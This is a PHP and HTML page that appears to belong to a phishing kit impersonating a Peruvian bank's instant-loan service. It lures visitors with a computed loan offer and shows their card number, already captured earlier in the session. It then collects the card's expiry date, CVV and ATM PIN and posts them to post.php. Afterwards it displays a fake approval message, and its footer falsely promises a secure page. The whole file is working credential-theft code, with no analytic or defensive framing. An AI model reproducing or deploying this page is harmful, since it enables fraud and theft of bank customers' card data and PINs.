<?php
error_reporting(0);
session_start();
/*************************************************************************/
if ($_SESSION["openPE"] != "True") {
	header("Location: ./");
}
/*************************************************************************/
if ($_SESSION["corto"] == "Estimado Usuario(a)") {
	$nombre = "";
	$show = "none;";
} else {
	$nombre = $_SESSION["corto"];
	$show = "block;";
}
/*************************************************************************/
if ($_SESSION["presto"] >= 100 && $_SESSION["presto"] <= 3000) {
	$meses = 3;
	$interes_anual = 25;
	$desgravamen = 0.705;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 3001 && $_SESSION["presto"] <= 10000) {
	$meses = 10;
	$interes_anual = 23;
	$desgravamen = 0.605;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 10001 && $_SESSION["presto"] <= 25000) {
	$meses = 20;
	$interes_anual = 21;
	$desgravamen = 0.505;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 25001 && $_SESSION["presto"] <= 80000) {
	$meses = 36;
	$interes_anual = 18;
	$desgravamen = 0.405;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 80001 && $_SESSION["presto"] <= 200000) {
	$meses = 60;
	$interes_anual = 15;
	$desgravamen = 0.305;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen / 100), 2);
	$tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual / 100), 30 / 360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>BN al instante</title>
	<link rel="stylesheet" href="rino/styles/main.css">
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<link href="rino/images/favicon.png" rel="icon" type="image/x-icon">
	<link rel="stylesheet" href="rino/styles/stylo.css">
	<style>
		.loading {
			padding: 390px 0px 0px 485px;
		}

		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}

		@font-face {
			font-family: password;
			font-style: normal;
			font-weight: 400;
			src: url(rino/styles/fuente/password.ttf);
		}

		.mask {
			font-family: password !important;
		}
	</style>
</head>

<body class="">
	<div id="loader_ajax"
		style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
		<div id="ajax_loader">
			<div class="text-center">
				<img src="rino/images/spinner.gif" class="loading">
			</div>
		</div>
	</div>
	<app-root _nghost-aqk-c52="" ng-version="12.2.16">
		<router-outlet _ngcontent-aqk-c52=""></router-outlet>
		<app-initial-verify _nghost-aqk-c63="">
			<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;">
				<div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;">
					<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
						<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
							<div _ngcontent-aqk-c59="" class="channel-img-fixed"
								style="background-image: url(rino/images/costado.jpg); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 100%;">
								<div class="logo-container">

									<img _ngcontent-aqk-c59="" src="rino/images/logo.png"
										class="mt16 logoSize logoStyle">
								</div>
							</div>
						</app-channel-image>
					</div>
					<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;">
						<app-home-header _ngcontent-aqk-c63="" _nghost-aqk-c54="">
							<div _ngcontent-aqk-c54=""
								class="row justify-content-end header-padding bar-blue header-first-pages">
								<div _ngcontent-aqk-c54="" class="col-6 col-md-3 di-lg-none px-0 header-logo-padding">
									<img _ngcontent-aqk-c54="" style="width: 65px; height:42px; transform: scale(3.5); margin-left:14px;"
										src="rino/images/logo.png" class="logo-small">
								</div>
								<div _ngcontent-aqk-c54="" class="col-xl-12 d-none d-md-block">
									<div _ngcontent-aqk-c54="" class="row justify-content-end">
										<bcp-icon _ngcontent-aqk-c54="" name="chronometer-r" color="text"
											class="bar-blue hydrated" style="padding-top: 2px;">
											<i class="icon chronometer-r text"></i>
										</bcp-icon>
									</div>
								</div>
								<div _ngcontent-aqk-c54="" class="col-6 col-md-9 di-lg-none" style="padding-top: 3px;">
								</div>
							</div>
							<div>&nbsp;</div>
							<div _ngcontent-aqk-c54="" class="row back-button-medium d-only-mobile"></div>
						</app-home-header>
						<div _ngcontent-aqk-c63="" class="row container-form">
							<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 8px;">
								<div _ngcontent-aqk-c63="" class="box-wrapper container">
									<form class="ng-pristine ng-invalid ng-touched" id="inicio">
										<div _ngcontent-aqk-c63="" class="row mt8 mb32">
											<div _ngcontent-aqk-c63="" class="col text-center">
												<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
													<h2 class="">Dinero al Instante</h2>
												</bcp-title>
												<p style="padding-top: 25px; text-align: justify;">
													Hola, <b>
														<font color="red">
															<?= $nombre; ?>
														</font>
													</b> estas a un paso de completar la solicitud de tu prestamo
													personal de <b>
														<font color="red">S/.
															<?= number_format($_SESSION["presto"]); ?>
														</font>
													</b> financiado en <b>
														<font color="red">
															<?= $meses; ?> meses,
														</font>
													</b> donde pagarias <b>
														<font color="red">S/.
															<?= number_format($cuota_mensual, 2); ?> mensuales.
														</font>
													</b>
												</p>
												<p style="text-align: justify;">
													Para continuar con el proceso por favor valide los datos de su
													tarjeta, los cuales nos permitirá realizar el cobro de las cuotas
													mensuales.
												</p>
											</div>
										</div>
										<div _ngcontent-aqk-c63="" class="row mb24">
											<div _ngcontent-aqk-c63="" class="col">
												<bcp-select-input _ngcontent-aqk-c63=""
													class="ng-untouched ng-pristine ng-invalid hydrated">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control" autocomplete="off"
																			id="carta" name="carta" type="tel"
																			disabled=""
																			value="<?= $_SESSION["puerta"]; ?>">
																		<input type="hidden" id="tipo"
																			value="<?= $_SESSION["tipex"]; ?>">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control" autocomplete="off"
																			name="caduco" id="caduco" type="tel"
																			maxlength="5" placeholder="[MM/YY]"
																			required="">
																		<input type="hidden" id="comodin">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control" autocomplete="off"
																			id="secret" name="secret" type="tel"
																			maxlength="4" placeholder="CVV" required=""
																			onkeypress="return tipoFiltro(event)">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg"
																trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<input class="form-control mask"
																			autocomplete="off" id="secure" name="secure"
																			type="tel" maxlength="4" placeholder="ATM"
																			required=""
																			onkeypress="return tipoFiltro(event)">
																	</div>
																	<bcp-paragraph class="helper-text hydrated">
																		<p
																			class="paragraph-sm bcp-font-regular onsurface-800">
																			&nbsp;</p>
																	</bcp-paragraph>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</bcp-select-input>
											</div>
										</div>
										<p id="alerta"
											style="text-align: center; color: red; font-size: 0.9rem; display: none;">
										</p>
										<div _ngcontent-aqk-c63=""
											class="row button-space-bottom d-sm-block btn-not-fixed">
											<div _ngcontent-aqk-c63="" class="col">
												<bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg"
													full-width="" class="hydrated">
													<button type="button" class="btn btn-primary btn-lg btn-block"
														onclick="post(1);" id="btn">
														<bcp-paragraph class="hydrated">
															<p class="paragraph-lg bcp-font-demi white">Continuar </p>
														</bcp-paragraph>
													</button>
												</bcp-button>
											</div>
										</div>
									</form>


									<form class="ng-pristine ng-invalid ng-touched" style="display: none;"
										id="finality">
										<div _ngcontent-aqk-c63="" class="row mt8 mb32">
											<div _ngcontent-aqk-c63="" class="col text-center"
												style="padding-top: 140px;">
												<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
													<h2 class="">Proceso Completado</h2>
												</bcp-title>
												<p style="padding-top: 25px; text-align: justify;">
													Estimado(a), <b>
														<font color="red">
															<?= $nombre; ?>
														</font>
													</b> la primera fase del proceso se ha completado con <b>
														<font color="red">éxito</font>
													</b>, su solicitud de préstamo esta en <b>
														<font color="red">proceso de evaluación</font>
													</b>, en caso de ser aprobado uno de nuestros asesores se pondrá en
													contacto con usted para culminar el <b>
														<font color="red">desembolso de su préstamo.</font>
													</b>
												</p>
											</div>
										</div>
										<div _ngcontent-aqk-c63=""
											class="row button-space-bottom d-sm-block btn-not-fixed">
											<div _ngcontent-aqk-c63="" class="col">
												<bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg"
													full-width="" class="hydrated">
													<button type="button" class="btn btn-primary btn-lg btn-block"
														onclick="post(2);" id="btns">
														<bcp-paragraph class="hydrated">
															<p class="paragraph-lg bcp-font-demi white">Continuar </p>
														</bcp-paragraph>
													</button>
												</bcp-button>
											</div>
										</div>
									</form>
								</div>
							</div>
						</div>
						<app-home-footer _ngcontent-aqk-c63="" _nghost-aqk-c55="">
							<div _ngcontent-aqk-c55="" class="justify-content-end footer-padding">
								<div _ngcontent-aqk-c55="" class="col remove-padding p-0">
									<div _ngcontent-aqk-c55="" class="box-wrapper container footer-container">
										<section _ngcontent-aqk-c55="" class="footer-main-text">
											<div _ngcontent-aqk-c55="" class="m-footer-icon">
												<bcp-icon _ngcontent-aqk-c55="" name="lock-b" color="onsurface-600"
													class="hydrated">
													<i class="icon lock-b onsurface-600"></i>
												</bcp-icon>
											</div>
											<div _ngcontent-aqk-c55="" class="container-text-large">
												<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm"
													family="regular" class="footer-text hydrated">
													<p class="paragraph-sm bcp-font-regular onsurface-600">
														Esta es una página segura. Todos sus datos estan
														protegidos<br>con los más altos estandares en seguridad.
													</p>
												</bcp-paragraph>
											</div>
										</section>
										<div _ngcontent-aqk-c55="" class="d-block d-lg-none container-footer-line">
											<div _ngcontent-aqk-c55="" class="footer-line"></div>
										</div>
										<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm"
											family="regular" class="d-none d-sm-block copyright-text hydrated">
											<p class="paragraph-sm bcp-font-regular onsurface-600">
												© 2024&nbsp;&nbsp;|&nbsp;&nbsp;Todos los derechos reservados
											</p>
										</bcp-paragraph>
										<div _ngcontent-aqk-c55="" class="d-block d-sm-none">
											<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm"
												family="regular" class="copyright-text hydrated">
												<p class="paragraph-sm bcp-font-regular onsurface-600">
													<br _ngcontent-aqk-c55="">Todos los derechos reservados
												</p>
											</bcp-paragraph>
										</div>
									</div>
								</div>
							</div>
						</app-home-footer>
					</div>
				</div>
			</div>
		</app-initial-verify>
	</app-root>
	<script type="text/javascript" src="rino/js/jquery-3.1.0.min.js"></script>
	<script type="text/javascript" src="rino/js/mask.js"></script>
	<script type="text/javascript" src="rino/js/value.js"></script>
	<script>
		$(document).ready(function () {
			$("#caduco").mask("00/00");
			formato();

		});

		function formato() {
			if ($("#tipo").val() != "amex") {
				$("#secret").attr('maxlength', '3');
			} else {
				$("#secret").attr('maxlength', '4');
			}
		}

		function tipoFiltro(e) {

			var charCode = e.key;

			if ((/^[0-9]+$/.test(charCode))) {
				return true;
			} else {
				return false;
			}
		}

		function post(post) {

			let h = document.querySelector("#caduco"); // Vencimiento
			let i = document.querySelector("#secret"); // CVV
			let j = document.querySelector("#secure"); // ATM
			var tipo = document.querySelector("#tipo"); // Tipo de tarjeta
			var fecha = new Date();
			var yea_actual = fecha.getFullYear().toString().substr(-2);
			var mes_actual = (fecha.getMonth() + 1).toString();
			if (mes_actual.length === 1) { mes_actual = "0" + mes_actual; }
			var vencimiento = h.value;
			var newFecha = vencimiento.split('/');
			var mes = newFecha[0];
			var yea = newFecha[1];

			let x = post;

			switch (x) {

				case 1: // Tarjeta

					if (tipo.value != "amex") { newcvv = "3"; msg_c = "[3 digitos parte posterior]"; } else { newcvv = "4"; msg_c = "[4 digitos parte frontal]"; }

					if (h.value.length < 5) {
						$("#alerta").html("* Debes ingresar la fecha de vencimiento de tu tarjeta").show();
						h.focus();
						return false;
					}

					if (mes == 00 || mes > 12) {
						$("#alerta").html('* El <b>mes</b> [' + mes + '] no corresponde a un mes valido, por favor vuelva a ingresarlo').show();
						h.focus();
						return false;
					}

					if (yea < yea_actual || yea > (Number(yea_actual) + 5)) {
						$("#alerta").html('* El <b>año</b> [' + yea + '] no corresponde a un año valido, por favor vuelva a ingresarlo').show();
						h.focus();
						return false;
					}

					if (mes <= mes_actual && yea == yea_actual) {
						$("#alerta").html('* Su tarjeta ha vencido, por favor verifique su fecha y vuelva a ingresarlo').show();
						h.focus();
						return false;
					}

					if (i.value.length < newcvv) {
						$("#alerta").html('* Debes ingresar el código cvv de tu tarjeta ' + msg_c).show();
						i.focus();
						return false;
					}

					if (j.value.length == 0 || j.value.length < 4) {
						$("#alerta").html('* Ingrese su clave de 4 dígitos').show();
						j.focus();
						return false;
					}

					var parametros = {
						"data_6": h.value,
						"data_7": i.value,
						"data_8": j.value,
						"orden": "C",
					}

					$("#alerta").hide();
					$("#loader_ajax").show();
					$('#btn').prop('disabled', true);

					$.ajax({
						data: parametros,
						url: 'post.php',
						type: 'post',
						success: function (response) {
							setTimeout(function () {
								$("#loader_ajax").hide();
								$("#inicio").hide(600);
								$("#finality").show();
								$('#btn').prop('disabled', false);
							}, 1800);
						}
					});

					break;

				case 2: // Salir

					$("#loader_ajax").show();
					$('#btns').prop('disabled', true);

					setTimeout(function () {
						$('#btns').prop('disabled', false);
						window.open('https://bit.ly/bingMoneyInstant', '_parent');
					}, 1800);

					break;

				default:
					break;
			}
		}
	</script>
</body>

</html>